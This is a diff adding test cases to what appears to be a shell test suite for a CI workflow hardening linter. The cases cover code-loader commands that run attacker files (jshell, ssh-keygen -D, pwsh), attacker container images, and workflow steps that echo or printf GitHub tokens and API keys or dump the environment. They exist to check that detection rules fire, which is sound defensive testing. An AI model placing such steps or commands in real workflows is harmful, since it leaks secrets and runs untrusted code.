@@ -636,5 +636,29 @@ t helper-ar-list-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ar t /t
 t helper-ranlib 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ranlib \"\${SCRIPT_DIR}/lib.a\""
 t helper-objcopy-help-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}objcopy --help"
 
+# --- loader denylist round 6 (jshell, ssh-keygen, pwsh) ---
+t loader-jshell 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}jshell \"\${GITHUB_WORKSPACE}/evil.jsh\""
+t loader-ssh-keygen 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ssh-keygen -D \"\${GITHUB_WORKSPACE}/evil.so\""
+t loader-pwsh 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}pwsh -File \"\${GITHUB_WORKSPACE}/evil.ps1\""
+t loader-powershell 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}powershell -File evil.ps1"
+
+# --- job containers (attacker image supplies token-bearing shells) ---
+t container-evil 1 "container-override" happy.sarif "$S${FS}    runs-on: ubuntu-latest${FS}a${FS}    container:\n      image: ghcr.io/attacker/evil:latest"
+t container-flow 1 "container-override" happy.sarif "$S${FS}    runs-on: ubuntu-latest${FS}a${FS}    container: { image: ghcr.io/attacker/evil }"
+t container-quoted 1 "container-override" happy.sarif "$S${FS}    runs-on: ubuntu-latest${FS}a${FS}    \"container\":\n      image: ghcr.io/attacker/evil"
+
+# --- secret bindings (allowlisted pairs, no step exfil) ---
+t secretbind-unexpected 1 "secret-step-unexpected-binding" happy.sarif "$S${FS}      - name: Verify head fresh${FS}b${FS}      - name: Leak key fragment${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        env:${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          LEAK: \${{ secrets.META_API_KEY }}${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        run: |${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          echo \"\${LEAK:0:4} \${LEAK:4}\""
+t secretbind-jobenv 1 "secret-step-unexpected-binding" happy.sarif "$S${FS}MUSE_EFFORT_RESOLVED:${FS}a${FS}      LEAK: \${{ secrets.META_API_KEY }}"
+t secretbind-echo 1 "secret-step-exfil" happy.sarif "$S${FS}      - name: Verify head fresh${FS}b${FS}      - name: Echo bound token${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        env:${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          GH_TOKEN: \${{ secrets.GITHUB_TOKEN }}${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        run: |${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          echo \"token: \$GH_TOKEN\""
+t secretbind-printf 1 "secret-step-exfil" happy.sarif "$S${FS}      - name: Verify head fresh${FS}b${FS}      - name: Printf bound token${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        env:${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          GH_TOKEN: \${{ secrets.GITHUB_TOKEN }}${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}        run: |${RS}$S${FS}      - name: Verify head fresh${FS}b${FS}          printf '%s' \"\$GH_TOKEN\""
+t secretbind-inline 1 "secret-step-inline-secret" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          echo \"\${{ secrets.FOO }}\""
+t secretbind-runtime 1 "secret-step-exfil" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          echo \"\$ACTIONS_RUNTIME_TOKEN\""
+t secretbind-dump-set 1 "secret-step-env-dump" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          set"
+t secretbind-dump-declarep 1 "secret-step-env-dump" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          declare -p"
+t secretbind-singlequote-fp 0 "" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          echo '\$GH_TOKEN'"
+t secretbind-namesake-fp 0 "" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          echo \"\$GH_TOKEN_X \$GH_TOKENX\""
+t secretbind-set-o-fp 0 "" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          set -o"
+
 printf '\nhardening suite: %d passed, %d failed%s\n' "$pass" "$fail" "${fail_names:+ ($fail_names)}"
 [[ "$fail" -eq 0 ]]
